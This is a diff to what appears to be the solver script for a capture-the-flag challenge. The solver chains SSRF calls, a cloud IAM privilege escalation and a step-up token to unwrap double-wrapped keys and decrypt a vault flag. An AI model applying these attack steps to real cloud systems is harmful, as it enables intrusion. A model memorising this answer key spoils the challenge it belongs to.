@@ -145,9 +145,10 @@ def solve(base: str, echo=print, state: dict = None) -> str:
     # ---- hop 5: cloud IAM privesc — mechanism depends on the discovered family -----------------
     caps = ssrf(f"{DEP}/deploy/capabilities")
     acts = caps["workload_actions"]
-    act_read = next(a for a, d in acts.items() if "blob" in d)
-    act_unwrap = next(a for a, d in acts.items() if "unwrap" in d)
-    st.update(act_read=act_read, act_unwrap=act_unwrap)
+    act_read = next(a for a, d in acts.items() if "reads the tenant vault blob" in d)
+    act_kek = next(a for a, d in acts.items() if "unwraps the KEK layer" in d)
+    act_dek = next(a for a, d in acts.items() if "unwraps the DEK layer" in d)
+    st.update(act_read=act_read, act_unwrap_kek=act_kek, act_unwrap_dek=act_dek)
     if family == "passrole-runas":
         pivot = next(name for name, p in desc["principals"].items()
                      if p.get("trust_policy", {}).get("Condition"))
@@ -160,22 +161,30 @@ def solve(base: str, echo=print, state: dict = None) -> str:
         grant = ssrf(f"{IAM}/iam/grant?p={b64u({'session': sess1, 'resource': resource})}")["job_grant"]
         base_req = {"grant": grant}
         st.update(resource=resource, escalation_artifact=base_req)
+    # read the DOUBLE-WRAPPED blob via the runs-as workload
     readresp = ssrf(f"{DEP}/deploy/run?p={b64u({**base_req, 'action': act_read})}")
-    marker(readresp)
-    blob = readresp["workload_output"]["blob"]
-    wrapped = readresp["workload_output"]["wrapped_data_key"]
-    unwrapresp = ssrf(f"{DEP}/deploy/run?p={b64u({**base_req, 'action': act_unwrap, 'input': wrapped})}")
-    dk = bytes.fromhex(unwrapresp["workload_output"]["data_key"])
-    st.update(blob=blob, data_key=dk.hex())
+    marker(readresp)  # h5 privesc marker (deployment)
+    out = readresp["workload_output"]
+    blob, wrapped_kek, wrapped_dek = out["blob"], out["wrapped_kek"], out["wrapped_dek"]
 
-    # ---- hop 6: decrypt the vault blob LOCALLY with the workload-unwrapped data key ------------
+    # ---- hop 5c: mint the DISTINCT step-up identity and unwrap the KEK layer, then the DEK layer ----
+    stepup = ssrf(f"{IAM}/iam/stepup?p={b64u({'session': sess1})}")["stepup_token"]
+    kekresp = ssrf(f"{DEP}/deploy/run?p={b64u({**base_req, 'action': act_kek, 'input': wrapped_kek, 'stepup': stepup})}")
+    marker(kekresp)  # h5b step-up / KEK-layer marker (cloudapp)
+    kek = kekresp["workload_output"]["kek"]
+    dekresp = ssrf(f"{DEP}/deploy/run?p={b64u({**base_req, 'action': act_dek, 'input': wrapped_dek, 'kek': kek})}")
+    dk = bytes.fromhex(dekresp["workload_output"]["data_key"])
+    st.update(blob=blob, stepup=stepup, kek=kek, data_key=dk.hex())
+
+    # ---- hop 6: decrypt the vault blob LOCALLY. AAD from the deployment manifest is REQUIRED — it is
+    # bound into the keystream (ks = SHA256(dk || aad || iv || ctr)), not only the tag -----------------
+    aad = ssrf(f"{DEP}/deploy/manifest")["context"].encode()
     iv, ct, tag = bytes.fromhex(blob["iv"]), bytes.fromhex(blob["ciphertext"]), bytes.fromhex(blob["tag"])
-    aad = blob["aad"].encode()
     if not hmac.compare_digest(hmac.new(dk, iv + aad + ct, hashlib.sha256).digest()[:16], tag):
         raise SolveError("blob integrity check failed")
     ks = bytearray()
     while len(ks) < len(ct):
-        ks += hashlib.sha256(dk + iv + (len(ks) // 32).to_bytes(4, "big")).digest()
+        ks += hashlib.sha256(dk + aad + iv + (len(ks) // 32).to_bytes(4, "big")).digest()
     flag = bytes(a ^ b for a, b in zip(ct, ks)).decode()
     if not FLAG_RE.search(flag):
         raise SolveError(f"decrypted value is not a flag: {flag!r}")
